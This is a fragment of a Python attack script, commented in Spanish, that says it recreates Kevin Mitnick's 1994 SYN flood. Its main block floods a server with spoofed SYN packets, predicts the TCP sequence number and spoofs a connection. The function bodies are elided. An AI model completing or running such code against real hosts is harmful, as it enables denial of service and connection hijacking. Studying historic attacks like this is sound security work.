...
#Recrea el SYN Flood ejecutado por Mitnick en 1994
...
if __name__ == '__main__':
    ...
    print('[+] Empezando SYN Flood para suprimir el servidor remoto.')
    syn_flood(_syn_spoof, _src_spoof)

    print('[+] Calculando el numero de secuencia TCP correcto.')
    _seq_num = cal_TSN(_target) + 1

    print('[+] Haciendo Spoofing a la Conexion.')
